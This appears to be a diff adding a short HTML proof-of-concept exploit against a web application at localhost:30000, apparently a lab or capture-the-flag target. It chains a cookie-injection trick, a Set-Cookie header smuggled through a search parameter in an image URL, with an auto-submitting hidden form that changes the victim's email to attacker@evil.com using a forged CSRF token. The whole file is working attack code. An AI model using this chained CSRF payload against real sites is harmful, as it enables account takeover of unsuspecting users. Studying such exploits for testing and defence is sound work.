@@ -1,0 +1,10 @@
+<form action="http://localhost:30000/updateEmail/"
+method="POST">
+<input type="hidden" name="new_email" value="attacker@evil.com" />
+<input required type="hidden" name="csrftoken"
+value="mycat" />
+<input type="submit" value="Update Email" />
+</form>
+<img
+src="http://localhost:30000/participants/?courseid=4&search=Set-Cookie:%20csrftoken=mycat%3b%20Same
+Site=None" onerror="document.forms[0].submit()">
